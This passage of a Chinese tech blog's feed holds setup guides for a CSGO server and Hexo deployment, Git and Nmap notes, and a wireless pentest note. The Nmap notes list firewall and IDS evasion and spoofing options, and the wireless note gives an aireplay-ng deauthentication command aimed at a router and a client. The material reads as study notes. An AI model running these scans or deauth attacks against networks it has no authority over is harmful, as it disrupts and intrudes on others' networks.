    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Navicat Premium 是一套多连接数据库开发工具，让你在单一应用程序中同时连接多达七种数据库：MySQL、MariaDB、MongoDB、SQL Server、SQLite、Oracle 和 PostgreSQL，可一次快速方便地访问所有数据库。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="软件工具" scheme="https://blog.secriy.com/categories/software/"/>
    
    
    <category term="Database" scheme="https://blog.secriy.com/tags/Database/"/>
    
    <category term="Software" scheme="https://blog.secriy.com/tags/Software/"/>
    
    <category term="Crack" scheme="https://blog.secriy.com/tags/Crack/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 搭建 CSGO 社区服务器</title>
    <link href="https://blog.secriy.com/csgo-on-centos7/"/>
    <id>https://blog.secriy.com/csgo-on-centos7/</id>
    <published>2020-02-20T16:19:08.000Z</published>
    <updated>2025-02-16T07:13:36.741Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>想和很多朋友一起玩 CSGO，苦于本地房间两地延迟太高无法正常游戏，因此用闲置服务器搭建 CSGO 社区服。</p></div><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li><p>云服务器：个人使用<strong>阿里云学生机（轻量应用服务器）</strong></p><ul><li>开放 UDP 27015 端口。</li></ul><blockquote><p>我是 5Mbps 1U1G 的机器，亲测七八个人没问题，十个人应该也可以。</p></blockquote></li><li><p>Xshell：用于连接服务器，其他同类软件皆可。</p></li></ul><h2 id="服务端安装"><a href="#服务端安装" class="headerlink" title="服务端安装"></a>服务端安装</h2><h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ol><li><p>创建新用户：</p><pre><code class="shell">useradd -m steam # 创建名为steam的新用户passwd steam  # 为新用户设置密码su steam   # 切换到新用户cd /home/steam/  # 进入用户目录</code></pre></li><li><p>安装 <code>steamcmd</code>：</p><pre><code class="shell">mkdir steamcmdcd steamcmdwget https://steamcdn-a.akamaihd.net/client/installer/steamcmd_linux.tar.gztar -zxvf steamcmd_linux.tar.gzrm steamcmd_linux.tar.gz</code></pre></li><li><p>安装 <code>steamcmd</code> 运行依赖项（略）。</p></li><li><p>运行 <code>steamcmd</code>：</p><pre><code class="shell">./steamcmd.sh</code></pre><p>成功运行会进入下图状态：</p><p><img src="/csgo-on-centos7/image-20200221004214677.png" class="lazyload" data-srcset="/csgo-on-centos7/image-20200221004214677.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li></ol><h3 id="安装-CSGO"><a href="#安装-CSGO" class="headerlink" title="安装 CSGO"></a>安装 CSGO</h3><pre><code class="shell">login anonymous      # 以匿名身份登录force_install_dir ./csgo_server  # 设置安装文件夹路径app_update 740 validate    # 安装CSGO服务端，等待完成</code></pre><p>出现 <strong>Success!</strong> 即安装完成，执行 <code>quit</code> 退出。</p><h3 id="一键更新脚本"><a href="#一键更新脚本" class="headerlink" title="一键更新脚本"></a>一键更新脚本</h3><p><strong>该脚本用于 CSGO 服务端的后期更新</strong></p><ol><li><p>在 <em>/home/steam/steamcmd</em> 下执行以下操作：</p><pre><code class="shell">vim update.txt</code></pre><p>写入以下文本，保存并退出</p><pre><code>login anonymousforce_install_dir ./csgo_serverapp_update 740quit</code></pre></li><li><p>创建运行脚本</p><pre><code class="shell">vim csgo_update.sh</code></pre><p>写入以下文本，保存并退出</p><pre><code class="bash">#!/bin/bash./steamcmd.sh +runscript update.txt</code></pre></li><li><p>测试脚本</p><pre><code class="shell">./csgo_update.sh</code></pre></li></ol><h2 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h2><ol><li><p>前往 <a href="https://steamcommunity.com/dev/managegameservers">Steam 游戏服务器帐户管理</a>创建服务器令牌：</p><p> <img src="/csgo-on-centos7/image-20200221010525719.png" class="lazyload" data-srcset="/csgo-on-centos7/image-20200221010525719.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p></li><li><p>在 <em>csgo_server/csgo/cfg</em> 路径下创建配置文件 <em>server.cfg</em>。</p></li><li><p>写入必要参数：</p><pre><code># 步骤1获取的服务器令牌IDsv_setsteamaccount &quot;XXXXXXXXXXXXXXXXXXXXXXXXX&quot;# 服务器名hostname &quot;wdnmd&quot;# 服务器管理密码rcon_password &quot;12345678&quot;# 服务器连接密码sv_password &quot;23333333&quot;</code></pre></li></ol><h2 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h2><ol><li><p>安装 screen：</p><pre><code class="shell">sudo yum install screen</code></pre></li><li><p>创建启动脚本：</p><blockquote><p>使用脚本启动方便修改启动项。</p></blockquote><p>进入 <em>/home/steam/steamcmd/csgo_server/</em> 路径，新建 <em>run.sh</em> 文件，写入以下形式的文本：</p><pre><code class="shell">screen ./srcds_run -console -game csgo -usercon -noipx -nomaster</code></pre><blockquote><p>部分启动项说明：</p><p>-console 打开游戏控制台</p><p>-usercon 可以从控制台管理服务器</p><p>-nomaster 使服务器无法被搜索</p><p>+map 加载地图</p><p>+game_mode 游戏模式</p></blockquote></li><li><p>启动服务器</p><pre><code class="shell">./run.sh</code></pre><p><img src="/csgo-on-centos7/image-20200221012223811.png" class="lazyload" data-srcset="/csgo-on-centos7/image-20200221012223811.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="csgo"></p><p>当出现上图显示的文字，服务器启动成功。</p></li></ol><h2 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h2><p>在控制台中输入 <code>connect [IP 地址];password [连接密码]</code> 即可连接。</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;想和很多朋友一起玩 CSGO，苦于本地房间两地延迟太高无法正常游戏，因此用闲置服务器搭建 CSGO 社区服。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="CSGO" scheme="https://blog.secriy.com/tags/CSGO/"/>
    
    <category term="Games" scheme="https://blog.secriy.com/tags/Games/"/>
    
  </entry>
  
  <entry>
    <title>云服务器搭建 Hexo 博客</title>
    <link href="https://blog.secriy.com/hexo-deploy/"/>
    <id>https://blog.secriy.com/hexo-deploy/</id>
    <published>2020-02-03T09:33:55.000Z</published>
    <updated>2025-02-16T07:13:36.790Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>一般 Hexo 搭建在 GItHub 上，然而国内访问稍慢，Gitee 免费版又不能自动更新，选择在服务器上搭建也是个办法。不过我觉得很浪费资源，最终还是选择了 GitHub Pages+Gitee Pages 的解决方案。</p></div><span id="more"></span><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li>本地端安装配置 Hexo</li><li>服务器端安装宝塔面板</li><li>服务器端安装 Git、Node.js、npm 等</li></ol><h2 id="服务器端配置"><a href="#服务器端配置" class="headerlink" title="服务器端配置"></a>服务器端配置</h2><ol><li><p>连接服务器。</p></li><li><p>执行如下命令：</p><pre><code class="shell">useradd git # 创建 git 用户passwd git # 输入自定义密码并确认chmod 740 /etc/sudoers # 修改文件权限</code></pre></li><li><p>编辑 <em>/etc/sudoers</em> 文件，在 <code>root ALL=(ALL) ALL</code> 下添加 <code>git ALL=(ALL) ALL</code>。</p></li><li><p>执行如下命令：</p><pre><code class="shell">chmod 400 /etc/sudoers    # 改回文件权限su git        # 切换至git用户sudo mkdir -p /www/wwwroot/blog  # 创建博客目录，自定义修改cd /home/gitmkdir reposcd reposgit init --bare hexo.git   # 创建仓库hexo.gitcd hexo.git/hooks</code></pre></li><li><p>在 <em>hooks/</em> 文件夹下创建 <em>post-receive</em> 文件并编辑（参数对照修改）：</p><pre><code class="bash">#!/bin/bashgit --work-tree=/www/wwwroot/blog --git-dir=/home/git/repos/hexo.git checkout -f</code></pre></li><li><p>退出并修改权限：</p><pre><code class="shell">chmod +x post-receiveexitchown -R git:git /home/git/repos/hexo.git</code></pre></li><li><p>修改 <em>/www/wwwroot/blog</em> 目录权限：</p><pre><code class="shell">chown -R git:git /www/wwwroot/blog</code></pre></li><li><p>宝塔面板新建网站，添加域名、配置根目录（即 <em>/www/wwwroot/blog</em>）</p></li></ol><h2 id="本地端配置"><a href="#本地端配置" class="headerlink" title="本地端配置"></a>本地端配置</h2><p>配置 <em>_config.yml</em> 文件：</p><ol><li><p>打开 Git Bash。</p></li><li><p>执行 <code>ssh-copy-id -i C:/Users/[用户名]/.ssh/id_rsa.pub git@[服务器 IP]</code>。</p></li><li><p>执行 <code>ssh git@[服务器 IP]</code> 测试能否免密远程连接。</p></li><li><p>修改 deploy 配置（注意空格）：</p><pre><code class="yaml">deploy:type: gitrepository: git@[服务器 IP]:/home/git/repos/hexo.gitbranch: master</code></pre></li></ol>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;一般 Hexo 搭建在 GItHub 上，然而国内访问稍慢，Gitee 免费版又不能自动更新，选择在服务器上搭建也是个办法。不过我觉得很浪费资源，最终还是选择了 GitHub Pages+Gitee Pages 的解决方案。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="经验教程" scheme="https://blog.secriy.com/categories/tutorial/"/>
    
    
    <category term="Hexo" scheme="https://blog.secriy.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Nmap 笔记</title>
    <link href="https://blog.secriy.com/nmap-note/"/>
    <id>https://blog.secriy.com/nmap-note/</id>
    <published>2019-10-21T17:19:15.000Z</published>
    <updated>2025-02-16T07:13:36.780Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>Nmap 操作笔记。</p></div><span id="more"></span><h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><p>Nmap 支持主机名，IP，网段的表示方式例如：<code>blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</code></p><pre><code class="bash">-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段-iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描--exclude host1[, host2]        从扫描任务中需要排除的主机--exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</code></pre><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre><code class="bash">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描-sn                     ping扫描,即主机发现-Pn                     不检测主机存活-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现-PE/PP/PM               使用ICMP echo, timestamp and netmask 请求包发现主机-PO[prococol list]      使用IP协议包探测对方主机是否开启-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</code></pre><h3 id="扫描技巧"><a href="#扫描技巧" class="headerlink" title="扫描技巧"></a>扫描技巧</h3><pre><code class="bash">-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描-sU                             UDP扫描-sN/sF/sX                       TCP NullFINand Xmas扫描--scanflags                     自定义TCP包中的flags-sI zombie host[:probeport]     Idlescan-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描-sO                             使用IP protocol 扫描确定目标机支持的协议类型-b “FTP relay host”             使用FTP bounce scan</code></pre><h3 id="指定端口和扫描顺序"><a href="#指定端口和扫描顺序" class="headerlink" title="指定端口和扫描顺序"></a>指定端口和扫描顺序</h3><pre><code class="bash">-p                      特定的端口 -p80,443 或者 -p1-65535-p U:PORT               扫描udp的某个端口, -p U:53-F                      快速扫描模式,比默认的扫描端口还少-r                      不随机扫描端口,默认是随机扫描的--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</code></pre><h3 id="服务版本识别"><a href="#服务版本识别" class="headerlink" title="服务版本识别"></a>服务版本识别</h3><pre><code class="bash">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高服务越有可能被正确识别。默认是7--version-light                 打开轻量级模式,为--version-intensity 2的别名--version-all                   尝试所有探测,为--version-intensity 9的别名--version-trace                 显示出详细的版本侦测过程信息</code></pre><h3 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h3><pre><code class="bash">-sC                             根据端口识别的服务,调用默认脚本--script=”Lua scripts”          调用的脚本名--script-args=n1=v1,[n2=v2]     调用的脚本传递的参数--script-args-file=filename     使用文本传递参数--script-trace                  显示所有发送和接收到的数据--script-updatedb               更新脚本的数据库--script-help=”Lua script”      显示指定脚本的帮助</code></pre><h3 id="OS-识别"><a href="#OS-识别" class="headerlink" title="OS 识别"></a>OS 识别</h3><pre><code class="bash">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时会尽可能地提供最相近的匹配Nmap默认进行这种匹配</code></pre><h4 id="防火墙-IDS-躲避和哄骗"><a href="#防火墙-IDS-躲避和哄骗" class="headerlink" title="防火墙/IDS 躲避和哄骗"></a>防火墙/IDS 躲避和哄骗</h4><pre><code class="bash">-f; --mtu value                 指定使用分片、指定数据包的MTU.-D decoy1,decoy2,ME             使用诱饵隐蔽扫描-S IP-ADDRESS                   源地址欺骗-e interface                    使用指定的接口-g/ --source-port PROTNUM       使用指定源端口--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理--data-length NUM               填充随机数据让数据包长度达到NUM--ip-options OPTIONS            使用指定的IP选项来发送数据包--ttl VALUE                     设置IP time-to-live域--spoof-mac ADDR/PREFIX/VEBDOR  MAC地址伪装--badsum                        使用错误的checksum来发送数据包</code></pre><h3 id="Nmap-输出"><a href="#Nmap-输出" class="headerlink" title="Nmap 输出"></a>Nmap 输出</h3><pre><code class="bash">-oN                     将标准输出直接写入指定的文件-oX                     输出xml文件-oS                     将所有的输出都改为大写-oG                     输出便于通过bash或者perl处理的格式,非xml-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出-v                      提高输出信息的详细度-d level                设置debug级别,最高是9--reason                显示端口处于带确认状态的原因--open                  只输出端口状态为open的端口--packet-trace          显示所有发送或者接收到的数据包--iflist                显示路由信息和接口,便于调试--log-errors            把日志等级为errors/warings的日志输出--append-output         追加到指定的文件--resume FILENAME       恢复已停止的扫描--stylesheet PATH/URL   设置XSL样式表转换XML输出--webxml                从namp.org得到XML的样式--no-sytlesheet         忽略XML声明的XSL样式表</code></pre><h3 id="其他-nmap-选项"><a href="#其他-nmap-选项" class="headerlink" title="其他 nmap 选项"></a>其他 nmap 选项</h3><pre><code class="bash">-6                      开启IPv6-A                      OS识别,版本探测,脚本扫描和traceroute--datedir DIRNAME       说明用户Nmap数据文件位置--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送--privileged            假定用户具有全部权限--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限-V                      打印版本信息-h                      输出帮助</code></pre>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Nmap 操作笔记。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="操作手册" scheme="https://blog.secriy.com/categories/manual/"/>
    
    
    <category term="CTF" scheme="https://blog.secriy.com/tags/CTF/"/>
    
    <category term="Kali Linux" scheme="https://blog.secriy.com/tags/Kali-Linux/"/>
    
  </entry>
  
  <entry>
    <title>Git 笔记</title>
    <link href="https://blog.secriy.com/git-note/"/>
    <id>https://blog.secriy.com/git-note/</id>
    <published>2019-10-19T10:26:42.000Z</published>
    <updated>2025-02-16T07:13:36.763Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>Git 常用操作笔记。</p></div><span id="more"></span><h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><h3 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h3><ul><li><code>--version</code></li><li><code>--help</code></li><li><code>-C &lt;path&gt;</code></li><li><code>-c &lt;name&gt;=&lt;value&gt;</code></li><li><code>--exec-path[=&lt;path&gt;]</code></li><li><code>--html-path</code></li><li><code>--man-path</code></li><li><code>--info-path</code></li><li><code>-p | --paginate | -P | --no-pager</code></li><li><code>--no-replace-objects</code></li><li><code>--bare</code></li><li><code>--git-dir=&lt;path&gt;</code></li><li><code>--work-tree=&lt;path&gt;</code></li><li><code>--namespace=&lt;name&gt;</code></li><li><code>--super-prefix=&lt;path&gt;</code></li><li><code>--config-env=&lt;name&gt;=&lt;envvar&gt;</code></li></ul><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><ul><li>clone</li><li>init</li></ul><h4 id="最近的改动"><a href="#最近的改动" class="headerlink" title="最近的改动"></a>最近的改动</h4><ul><li>add</li><li>mv</li><li>restore</li><li>rm</li><li>sparse-checkout</li></ul><h4 id="检查历史和状态"><a href="#检查历史和状态" class="headerlink" title="检查历史和状态"></a>检查历史和状态</h4><ul><li>bisect</li><li>diff</li><li>grep</li><li>log</li><li>show</li><li>status</li></ul><h4 id="分支与提交"><a href="#分支与提交" class="headerlink" title="分支与提交"></a>分支与提交</h4><ul><li>branch</li><li>commit</li><li>merge</li><li>rebase</li><li>reset</li><li>switch</li><li>tag</li></ul><h4 id="多人协同"><a href="#多人协同" class="headerlink" title="多人协同"></a>多人协同</h4><ul><li>fetch</li><li>pull</li><li>push</li></ul><h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><blockquote><p>个人代码工作空间称为工作区</p></blockquote><h3 id="初始化和提交"><a href="#初始化和提交" class="headerlink" title="初始化和提交"></a>初始化和提交</h3><ol><li><p>初始化仓库</p><pre><code class="shell">cd path_to/  # 切换到指定目录git init</code></pre></li><li><p>克隆仓库：<code>git clone &lt;url&gt;</code></p></li><li><p>添加文件到暂存区</p><blockquote><p>空目录和 .gitignore 指定的目录和文件不会添加到暂存区</p></blockquote><pre><code class="shell">git add README.mdgit add . # 所有文件</code></pre></li><li><p>提交本次修改</p><pre><code class="shell">git commit # 在打开的编辑器中按照 commit 规范填写 commit message，保存并关闭编辑器以生效git commit -m &quot;First Commit&quot; # 不建议使用</code></pre></li><li><p>查看工作区状态：<code>git status</code></p></li><li><p>对比提交中文件变化：<code>git diff &lt;file_name&gt;</code></p></li><li><p>提交日志</p><pre><code class="shell">git log      # 详细git log --pretty=oneline # 简略</code></pre></li></ol><h3 id="仓库配置"><a href="#仓库配置" class="headerlink" title="仓库配置"></a>仓库配置</h3><ol><li><p>配置全局用户名和邮箱</p><pre><code class="shell">git config --global user.name &quot;&lt;user_name&gt;&quot;git config --global user.email &quot;&lt;email_address&gt;&quot;</code></pre></li><li><p>配置当前仓库用户名和邮箱</p><pre><code class="shell">git config user.name &quot;&lt;user_name&gt;&quot;git config user.email &quot;&lt;email_address&gt;&quot;</code></pre></li><li><p>添加远程仓库：<code>git remote add &lt;remote-repo&gt; &lt;remote-address&gt;</code></p></li></ol><h3 id="撤销更改"><a href="#撤销更改" class="headerlink" title="撤销更改"></a>撤销更改</h3><ol><li>工作区文件撤销：<code>git checkout &lt;file_name&gt;</code></li><li>暂存区文件撤销<ul><li>暂存区 -&gt; 工作区：<code>git reset HEAD &lt;file_name&gt;</code></li><li>撤销修改：<code>git checkout &lt;file_name&gt;</code></li></ul></li></ol><h3 id="回退版本"><a href="#回退版本" class="headerlink" title="回退版本"></a>回退版本</h3><ol><li><p>修改上次的提交：<code>git commit --amend</code></p><p> 执行后会打开编辑器，可以编辑上一次的提交信息以及修改上一次的提交内容，关闭编辑器以结束修改。</p></li><li><p>撤销暂存区内容：<code>git reset HEAD</code></p><p> <code>HEAD</code> 指向最后一次提交</p></li><li><p>撤销提交</p><ul><li><p>撤销到指定提交，并撤销暂存区内容</p><pre><code class="shell">git reset --mixed HEAD  # 撤销到当前提交git reset --mixed HEAD^  # 撤销到上次提交git reset --mixed HEAD~n # 撤销到上 n 次提交</code></pre><p><code>HEAD^</code> 代指 <code>HEAD</code> 前一次提交。</p></li><li><p>撤销到指定提交，并保留暂存区内容</p><pre><code class="shell">git reset --soft HEAD^</code></pre><p>保留的暂存区内容是被撤销的提交中所有的改动。</p></li><li><p>撤销到指定提交，并撤销暂存区内容，将工作区回滚到指定提交的状态</p><pre><code class="shell">git reset --hard HEAD^</code></pre></li></ul></li><li><p>撤销历史某次提交</p><pre><code class="shell">git revert &lt;SHA&gt;</code></pre><p> <code>&lt;SHA&gt;</code> 指指定某次提交的散列值。</p><p> 撤销后会自动新增一次提交，其内容为撤销指定提交后的内容。</p><p> 如果出现冲突会要求处理冲突再进行提交。</p></li></ol><h3 id="重做提交"><a href="#重做提交" class="headerlink" title="重做提交"></a>重做提交</h3><ol><li>查看历史提交以及被回退的提交（有时限，且只在本地）：<code>git reflog</code></li><li>重做某版本：<code>git reset --hard &lt;commit_id&gt;</code></li></ol><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><ol><li><p>从版本库中删除文件（修改后需要提交）：<code>git rm &lt;file_name&gt;</code></p></li><li><p>恢复删除：参考撤销</p></li><li><p>从版本库中删除文件，但保留本地文件：<code>git rm --cached &lt;file_name&gt;</code></p></li></ol><h3 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h3><ol><li>重命名文件：<code>git mv</code></li><li>重命名文件夹：<code>git mv</code></li></ol><h3 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h3><ol><li><p>查看远程仓库信息</p><pre><code class="shell">git remote  # 简略git remote -v # 详细</code></pre></li><li><p>拉取远程仓库内容</p><pre><code class="shell">git pull</code></pre><p> 默认获取远程主分支内容，合并到本地主分支。</p><p> <code>git pull</code> 实际上是 <code>git fetch</code> 和 <code>git merge</code> 的组合。</p></li><li><p>手动拉取<br> 拉取远程分支：<code>git fetch</code></p><p> 合并到本地分支：<code>git merge &lt;remote&gt;/&lt;branch&gt;</code></p><p> 示例：<code>git merge origin/master</code></p></li><li><p>推送</p><pre><code class="shell">git pushgit push &lt;remote_repo&gt; &lt;remote_branch&gt;</code></pre></li></ol><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><h3 id="创建和切换"><a href="#创建和切换" class="headerlink" title="创建和切换"></a>创建和切换</h3><blockquote><p>默认会创建主干分支，一般为 <code>master</code>，由于美国的 <em>Black Lives Matter</em> 运动，master 被视为种族歧视词汇，很多企业和机构改使用 <code>main</code> 替代 <code>master</code>。</p></blockquote><ol><li><p>查看所有分支</p><pre><code class="shell">git branch  # 查看本地分支，标 * 的分支即当前分支git branch -v # 查看本地分支的版本git branch -a # 查看所有分支（包括远程分支）git branch -av # 查看所有分支的版本（包括远程分支）</code></pre></li><li><p>创建新分支：<code>git branch &lt;branch_name&gt;</code></p></li><li><p>切换到新分支：<code>git switch &lt;branch_name&gt;</code></p></li><li><p>创建并切换到新分支：<code>git switch -c &lt;branch_name&gt;</code></p></li></ol><h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><ol><li><p>删除本地分支</p><pre><code class="shell">git branch -D &lt;branch_name&gt;  # 删除未合并分支git branch -d &lt;branch_name&gt;  # 删除已合并分支</code></pre></li><li><p>删除远程分支：<code>git push &lt;remote_repo&gt; -d &lt;remote_branch&gt;</code></p></li></ol><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><ol><li><p>合并指定分支到当前分支：<code>git merge &lt;other_branch&gt;</code></p></li><li><p>合并分支、解决冲突</p><ol><li><p>将要合并的分支更新到最新</p></li><li><p>切换到主分支</p></li><li><p>合并分支</p></li><li><p>解决合并时的 conflict</p></li><li><p>提交到版本库</p></li><li><p>合并成功</p></li><li><p>查看分支状态</p><pre><code class="shell">git log --graphgit log -- graph --pretty=oneline --abbrey-commit</code></pre></li></ol></li></ol><h3 id="暂存修改"><a href="#暂存修改" class="headerlink" title="暂存修改"></a>暂存修改</h3><ol><li><p>暂存工作现场：<code>git stash</code></p></li><li><p>恢复工作现场</p><pre><code class="shell">git stash apply # 恢复git stash drop # 删除git stash pop # 恢复 + 删除</code></pre></li></ol>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;Git 常用操作笔记。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="操作手册" scheme="https://blog.secriy.com/categories/manual/"/>
    
    
    <category term="Git" scheme="https://blog.secriy.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>无线渗透笔记</title>
    <link href="https://blog.secriy.com/wireless-pentest-note/"/>
    <id>https://blog.secriy.com/wireless-pentest-note/</id>
    <published>2019-07-14T15:51:41.000Z</published>
    <updated>2025-02-16T07:27:11.408Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>使用 Aircrack-ng 套件进行无线攻击测试。</p></div><span id="more"></span><h2 id="无线监听"><a href="#无线监听" class="headerlink" title="无线监听"></a>无线监听</h2><h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><h4 id="无线网卡的四种工作模式"><a href="#无线网卡的四种工作模式" class="headerlink" title="无线网卡的四种工作模式"></a>无线网卡的四种工作模式</h4><ul><li><p>Managed：用于设备与 AP 直接连接， <strong>无线网卡的驱动程序依赖无线 AP 管理整个通信过程。</strong></p></li><li><p>Ad hoc：当你的网络由<strong>互相直连的设备组成</strong>时，就使用这个模式。在这个模式中，无线通信双方共同承担 WAP 的职责。</p></li><li><p>Master：主模式，允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的 WAP。</p></li><li><p>Monitor：监听模式，停止收发数据，监听无线数据包。</p></li></ul><h3 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h3><h4 id="切换为监听模式"><a href="#切换为监听模式" class="headerlink" title="切换为监听模式"></a>切换为监听模式</h4><ul><li><p>启动 Airmon-ng：</p><pre><code class="shell">iwconfigairmon-ng start wlx70f11c280f23 # airmon-ng start wlan0</code></pre></li><li><p>关闭 Network Manager：</p><pre><code class="shell">service network-manager stop</code></pre></li><li><p>开启 Network Manager：</p><pre><code class="shell">service network-manager restart</code></pre></li></ul><h4 id="开启监听"><a href="#开启监听" class="headerlink" title="开启监听"></a>开启监听</h4><ul><li><p>使用 Airodump-ng：</p><pre><code class="shell">airodump-ng wlan0mon</code></pre></li></ul><h4 id="捕获数据"><a href="#捕获数据" class="headerlink" title="捕获数据"></a>捕获数据</h4><ul><li><p>Wireshark：选择监听网卡捕获数据</p></li><li><p>Airodump-ng：</p><pre><code class="shell">airodump-ng -c 1 wlan0mon -w data # -c 信道 -w 输出目录名</code></pre></li></ul><h2 id="WiFi-Crack"><a href="#WiFi-Crack" class="headerlink" title="WiFi Crack"></a>WiFi Crack</h2><h3 id="开启监听-1"><a href="#开启监听-1" class="headerlink" title="开启监听"></a>开启监听</h3><pre><code class="shell">airmon-ng start wlan0</code></pre><h3 id="扫描信号"><a href="#扫描信号" class="headerlink" title="扫描信号"></a>扫描信号</h3><pre><code class="shell">airodump-ng wlan0mon</code></pre><h3 id="选定-Wi-Fi-监听"><a href="#选定-Wi-Fi-监听" class="headerlink" title="选定 Wi-Fi 监听"></a>选定 Wi-Fi 监听</h3><pre><code class="shell">airodump-ng wlan0mon -c 11 --bssid BC:46:99:3D:66:D6 -w doc # -w 指定生成的文件名 -c 指定信道 --bssid 指定路由器的 MAC 地址</code></pre><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><pre><code class="shell">aireplay-ng -0 50 -a E2:A5:3E:6B:F7:21 -c 44:C3:46:40:7E:5D   wlan0mon # -0 指定发包的数量 -a 指定路由器的MAC地址  -c 指定连接的客户端的 MAC 地址</code></pre>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;使用 Aircrack-ng 套件进行无线攻击测试。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="信息安全" scheme="https://blog.secriy.com/categories/infosec/"/>
    
    
    <category term="Kali Linux" scheme="https://blog.secriy.com/tags/Kali-Linux/"/>
    
    <category term="Wireless" scheme="https://blog.secriy.com/tags/Wireless/"/>
    
